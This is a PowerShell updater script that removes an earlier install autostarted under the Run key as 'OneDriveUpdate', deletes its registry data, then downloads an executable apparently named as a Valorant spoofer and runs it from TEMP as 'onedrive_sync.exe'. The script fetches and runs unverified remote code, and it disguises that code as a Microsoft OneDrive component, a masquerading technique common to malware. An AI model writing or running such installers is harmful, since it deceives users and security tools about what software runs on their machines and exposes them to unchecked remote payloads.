Write-Host "Removing stuff..." -ForegroundColor Cyan

$runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$valName = 'OneDriveUpdate'
$dataPath = 'HKCU:\Software\VLR_Driver_Sync'

$oldPath = (Get-ItemPropertyValue -Path $runKey -Name $valName -ErrorAction SilentlyContinue)
if ($oldPath) {
    Write-Host "Found real path: $oldPath" -ForegroundColor Yellow
    Get-Process | Where-Object { $_.Path -eq $oldPath } | Stop-Process -Force -ErrorAction SilentlyContinue
    
    Start-Sleep -Seconds 1 # Wait for process to stop
    
    if (Test-Path $oldPath) {
        Remove-Item $oldPath -Force -ErrorAction SilentlyContinue
        Write-Host "Deleted: $oldPath" -ForegroundColor Green
    }
    
    Remove-ItemProperty -Path $runKey -Name $valName -ErrorAction SilentlyContinue
    Write-Host "Deleted startup entry: $valName" -ForegroundColor Green
} else {
    Write-Host "No existing installation found." -ForegroundColor Yellow
}

if (Test-Path $dataPath) {
    Remove-Item $dataPath -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "Deleted registry data: $dataPath" -ForegroundColor Green
}

Write-Host "Reinstalling newest best version..." -ForegroundColor Cyan

$newPath = "$env:TEMP\onedrive_sync.exe"
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/goatdotlol/new/main/bin/vlrnt_sb_spoofer.exe' -OutFile $newPath -UseBasicParsing
Start-Process $newPath
Write-Host "Done!" -ForegroundColor Green
